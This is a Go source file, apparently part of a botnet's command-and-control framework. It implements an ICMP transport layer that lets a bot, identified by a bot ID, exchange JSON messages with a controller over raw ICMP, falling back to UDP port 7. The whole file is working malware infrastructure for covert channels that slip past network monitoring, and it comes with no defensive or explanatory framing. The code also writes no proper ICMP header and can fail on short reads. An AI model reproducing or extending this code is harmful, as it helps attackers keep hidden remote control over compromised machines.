package c2

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"sync"
	"time"
)

type ICMPLayer struct {
	botID     string
	target    string
	conn      net.Conn
	mu        sync.Mutex
	connected bool
	recvCh    chan *Message
	seq       uint16
}

func NewICMPLayer(botID, target string) *ICMPLayer {
	return &ICMPLayer{
		botID:  botID,
		target: target,
		recvCh: make(chan *Message, 64),
	}
}

func (i *ICMPLayer) Name() string { return "icmp" }

func (i *ICMPLayer) Connect() error {
	i.mu.Lock()
	defer i.mu.Unlock()

	conn, err := net.DialTimeout("ip4:icmp", i.target, 10*time.Second)
	if err == nil {
		i.conn = conn
		i.connected = true
		go i.readLoop()
		return nil
	}

	conn2, err := net.DialTimeout("udp", i.target+":7", 10*time.Second)
	if err != nil {
		return fmt.Errorf("icmp dial: %w", err)
	}
	i.conn = conn2
	i.connected = true
	go i.readLoop()
	return nil
}

func (i *ICMPLayer) Send(msg *Message) error {
	i.mu.Lock()
	defer i.mu.Unlock()
	if !i.connected || i.conn == nil {
		return fmt.Errorf("icmp not connected")
	}

	data, _ := json.Marshal(msg)
	i.seq++

	var buf bytes.Buffer
	binary.Write(&buf, binary.BigEndian, i.seq)
	buf.Write(data)

	for buf.Len() < 48 {
		buf.WriteByte(0)
	}

	_, err := i.conn.Write(buf.Bytes())
	return err
}

func (i *ICMPLayer) Receive() (*Message, error) {
	select {
	case msg := <-i.recvCh:
		return msg, nil
	case <-time.After(60 * time.Second):
		return nil, fmt.Errorf("timeout")
	}
}

func (i *ICMPLayer) readLoop() {
	buf := make([]byte, 1500)
	for {
		i.mu.Lock()
		conn := i.conn
		i.mu.Unlock()
		if conn == nil {
			return
		}

		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		n, err := conn.Read(buf)
		if err != nil {
			continue
		}

		var seq uint16
		r := bytes.NewReader(buf[:n])
		binary.Read(r, binary.BigEndian, &seq)

		var msg Message
		if json.Unmarshal(buf[2:n], &msg) != nil {
			continue
		}
		select {
		case i.recvCh <- &msg:
		default:
		}
	}
}

func (i *ICMPLayer) Close() error {
	i.mu.Lock()
	defer i.mu.Unlock()
	i.connected = false
	if i.conn != nil {
		return i.conn.Close()
	}
	return nil
}

func (i *ICMPLayer) IsConnected() bool {
	i.mu.Lock()
	defer i.mu.Unlock()
	return i.connected
}
